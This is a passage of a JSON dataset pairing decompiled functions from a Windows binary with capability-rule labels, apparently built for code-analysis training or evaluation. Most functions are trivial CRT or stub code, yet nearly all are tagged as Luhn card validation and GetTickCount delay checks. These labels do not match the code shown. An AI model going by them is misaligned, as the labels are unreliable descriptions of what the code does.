        "decompiled_code": "\nvoid fcn.00408c80(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_8h;\n    \n    puVar2 = &fcn.00408c80::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.00408c60(0);\n    var_8h = 0x408cba;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 142
    },
    "00408d80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00408d80(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_8h;\n    \n    puVar2 = &fcn.00408d80::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.00409450(0x10, 1);\n    var_ch = 0x408dbc;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 144
    },
    "00409230": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00409230(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_8h;\n    \n    puVar2 = &fcn.00409230::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.00409270(0);\n    var_8h = 0x40926a;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 140
    },
    "00409400": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00409400(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_8h;\n    \n    puVar2 = &var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.00407e10(0x10);\n    fcn.00409450(10, 0);\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 137
    },
    "00409aa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00409aa0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_ch;\n    uint var_8h;\n    \n    puVar3 = &var_ch;\n    for (iVar2 = 3; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    cVar1 = fcn.00407930(0x20);\n    if (cVar1 != '\\0') {\n        fcn.00407e10(0x80);\n    }\n    fcn.00409450(8, 0);\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 173
    },
    "00409b00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409b00(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    int32_t var_8h;\n    \n    puVar2 = &fcn.00409b00::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    *(param_1 + 0x28) = 8;\n    *(param_1 + 0x2c) = 10;\n    var_8h = param_1;\n    fcn.00409450(0x10, 1);\n    var_ch = 0x409b50;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 195
    },
    "00409c80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409c80(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.00409c80::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    sub.msvcrt.dll_strnlen(*(in_ECX + 0x34), arg_8h);\n    uStack8 = 0x409cc3;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 175
    },
    "00409cd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00409cd0(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_8h;\n    \n    puVar2 = &fcn.00409cd0::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.00409450(10, 0);\n    var_ch = 0x409d0c;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 144
    },
    "00409d10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00409d10(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_8h;\n    \n    puVar2 = &fcn.00409d10::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.00409450(0x10, 0);\n    var_ch = 0x409d4c;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 146
    },
    "00409d80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409d80(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_ch;\n    int32_t var_8h;\n    uint uStack8;\n    \n    puVar3 = &fcn.00409d80::var_ch;\n    for (iVar2 = 3; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    var_8h = param_1;\n    uVar1 = fcn.004068a0(param_1 + 0x14);\n    *(var_8h + 0x24) = uVar1;\n    uStack8 = 0x409dc7;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 200
    },
    "00409dd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409dd0(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_ch;\n    int32_t var_8h;\n    uint uStack8;\n    \n    puVar3 = &fcn.00409dd0::var_ch;\n    for (iVar2 = 3; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    var_8h = param_1;\n    uVar1 = fcn.004068a0(param_1 + 0x14);\n    *(var_8h + 0x28) = uVar1;\n    uStack8 = 0x409e17;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 200
    },
    "00409fe0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409fe0(uint32_t arg_8h, int32_t *arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_ch;\n    uint var_8h;\n    \n    puVar3 = &fcn.00409fe0::var_ch;\n    for (iVar2 = 3; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0xcccccccc;\n        puVar3 = puVar3 + 1;\n    }\n    cVar1 = fcn.0040a050(arg_8h & 0xff);\n    if (cVar1 == '\\0') {\n        *arg_ch = -1;\n    }\n    else {\n        *arg_ch = *arg_ch + 1;\n    }\n    var_8h = 0x40a03c;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 213
    },
    "0040a270": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a270(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_8h;\n    \n    puVar2 = &var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.0040a2c0(arg_8h, arg_ch, arg_10h, arg_14h);\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 162
    },
    "0040a2c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a2c0(uint8_t *arg_8h, int32_t arg_ch, int32_t *arg_10h, uint arg_14h)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    ulong uVar5;\n    uint var_34h;\n    uint8_t *var_30h;\n    uint8_t *var_24h;\n    uint var_18h;\n    uint var_8h;\n    \n    puVar4 = &fcn.0040a2c0::var_34h;\n    for (iVar3 = 0xd; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0xcccccccc;\n        puVar4 = puVar4 + 1;\n    }\n    arg_8h_00 = fcn.004078e0();\n    fcn.00406fe0(arg_8h_00);\n    var_24h = arg_8h + arg_ch;\n    var_30h = arg_8h;\n    do {\n        if (var_30h == var_24h) {\ncode_r0x0040a360:\n            uVar5 = fcn.00407210();\n            fcn.00411450(uVar5);\n            var_8h = 0x40a389;\n            fcn.004114b0();\n            return;\n        }\n        cVar1 = fcn.0040a050(*var_30h);\n        if (cVar1 == '\\0') {\n            piVar2 = fcn.004078e0();\n            if (*piVar2 != 0x2a) {\n                *arg_10h = -1;\n                goto code_r0x0040a360;\n            }\n            fcn.00409fe0(0x3f, arg_10h);\n        }\n        else {\n            *arg_10h = *arg_10h + 1;\n        }\n        var_30h = var_30h + 1;\n    } while( true );\n}\n",
        "token_count": 476
    },
    "0040a470": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a470(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    puVar2 = &stack0xfffffffc;\n    for (iVar1 = 0; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.00405fa0(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch);\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 172
    },
    "0040a530": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a530(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    puVar2 = &stack0xfffffffc;\n    for (iVar1 = 0; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.0040a4c0(arg_8h & 0xff, 4, arg_ch);\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 139
    },
    "0040a5d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.0040a5d0(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    puVar2 = &stack0xfffffffc;\n    for (iVar1 = 0; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    (*_sym.imp.msvcrt.dll__lock)(0xc);\n    fcn.004114b0();\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 128
    },
    "0040a610": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.0040a610(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    puVar2 = &stack0xfffffffc;\n    for (iVar1 = 0; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    (*_sym.imp.msvcrt.dll__unlock)(0xc);\n    fcn.004114b0();\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 126
    },
    "0040a660": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a660(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    puVar2 = &stack0xfffffffc;\n    for (iVar1 = 0; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    (*_sym.imp.msvcrt.dll___set_app_type)(arg_8h);\n    *0x419554 = fcn.004114b0();\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 142
    },
    "0040a6b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a6b0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    puVar2 = &stack0xfffffffc;\n    for (iVar1 = 0; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.0040a710(arg_8h, 0x20 - *0x41900c % 0x20);\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 140
    },
    "0040a930": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.0040a930(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.0040a930::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.0040a6b0(0);\n    uStack8 = 0x40a96a;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 151
    },
    "0040aa80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040aa80(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    puVar2 = &stack0xfffffffc;\n    for (iVar1 = 0; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.0040a710(arg_8h ^ *0x41900c, *0x41900c % 0x20);\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 142
    },
    "0040aad0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040aad0(uint hModule, uint lpProcName)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    puVar2 = &stack0xfffffffc;\n    for (iVar1 = 0; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetProcAddress)(hModule, lpProcName);\n    fcn.004114b0();\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 139
    },
    "0040ab60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.0040ab60(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.0040ab60::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.0040ad80();\n    uStack8 = 0x40ab98;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 146
    },
    "0040ad80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040ad80(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_ch;\n    int32_t *var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.0040ad80::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    iVar1 = fcn.00405830();\n    if (*var_8h != iVar1) {\n        fcn.0040ade0(*var_8h);\n        iVar1 = fcn.00405830();\n        *var_8h = iVar1;\n    }\n    uStack8 = 0x40add6;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 200
    },
    "0040ade0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ade0(uint hLibModule)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_c4h;\n    uint var_4h;\n    \n    puVar2 = &var_4h;\n    for (iVar1 = 1; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(hLibModule);\n    fcn.004114b0();\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 146
    },
    "0040af60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040af60(uint uExitCode)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    puVar4 = &stack0xfffffffc;\n    for (iVar3 = 0; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0xcccccccc;\n        puVar4 = puVar4 + 1;\n    }\n    cVar1 = fcn.0040b0c0();\n    if (cVar1 != '\\0') {\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(uExitCode);\n        uVar2 = fcn.004114b0();\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar2);\n        fcn.004114b0();\n    }\n    fcn.0040b140(uExitCode);\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(uExitCode);\n    fcn.004114b0();\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 242
    },
    "0040b0c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040b0e8)\n// WARNING: Removing unreachable block (ram,0x0040b104)\n// WARNING: Removing unreachable block (ram,0x0040b0fb)\n// WARNING: Removing unreachable block (ram,0x0040b10b)\n// WARNING: Removing unreachable block (ram,0x0040b120)\n// WARNING: Removing unreachable block (ram,0x0040b11c)\n\nvoid fcn.0040b0c0(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_cdh;\n    uint var_10h;\n    uint var_5h;\n    \n    puVar2 = &fcn.0040b0c0::var_10h;\n    for (iVar1 = 4; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    stack0xfffffff8 = 0x40b132;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 248
    },
    "0040b280": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.0040b280(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    puVar2 = &stack0xfffffffc;\n    for (iVar1 = 0; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.0040ae50(0, 2, 1);\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 119
    },
    "0040b2c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.0040b2c0(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    puVar2 = &stack0xfffffffc;\n    for (iVar1 = 0; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.0040ae50(0, 0, 1);\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 121
    },
    "0040b300": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b300(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    puVar2 = &stack0xfffffffc;\n    for (iVar1 = 0; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.0040ae50(arg_8h, 2, 0);\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 127
    },
    "0040b340": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b340(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_c5h;\n    uint var_ch;\n    uint uStack8;\n    \n    puVar2 = &fcn.0040b340::var_ch;\n    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.0040ad30(0);\n    iVar1 = fcn.0040a930();\n    if (*0x419564 != iVar1) {\n        sub.msvcrt.dll_void___cdecl_terminate_void_();\n    }\n    *0x419564 = fcn.0040a6b0(arg_8h);\n    uStack8 = 0x40b3a4;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 216
    },
    "0040b3b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b3b0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    puVar2 = &stack0xfffffffc;\n    for (iVar1 = 0; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.0040ae50(arg_8h, 0, 0);\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 129
    },
    "0040bbc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bbc0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    puVar2 = &stack0xfffffffc;\n    for (iVar1 = 0; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.0040bd10(0x41957c, arg_8h);\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 128
    },
    "0040bd90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.0040bd90(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    puVar2 = &stack0xfffffffc;\n    for (iVar1 = 0; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.0040bc80(0x41957c);\n    fcn.0040bc80(0x419588);\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 131
    },
    "0040be00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.0040be00(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_d1h;\n    uint var_18h;\n    uint var_8h;\n    uint uStack8;\n    \n    puVar2 = &fcn.0040be00::var_18h;\n    for (iVar1 = 6; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.0040ad30(0);\n    var_8h = fcn.0040a930();\n    fcn.0040b260(var_8h);\n    uStack8 = 0x40be57;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 186
    },
    "0040be60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.0040be60(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    puVar2 = &stack0xfffffffc;\n    for (iVar1 = 0; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.00404a50(0);\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 113
    },
    "0040bea0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.0040bea0(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    puVar2 = &stack0xfffffffc;\n    for (iVar1 = 0; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    sub.msvcrt.dll_free(*0x4195b0, 2);\n    *0x4195b0 = 0;\n    sub.msvcrt.dll_free(*0x4195b4, 2);\n    *0x4195b4 = 0;\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 163
    },
    "0040bf10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.0040bf10(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    puVar2 = &stack0xfffffffc;\n    for (iVar1 = 0; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0xcccccccc;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.0040e1f0(0x4144bc, 0x4144e4);\n    fcn.004114b0();\n    return;\n}\n",
        "token_count": 127
    },
    "0040bf50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
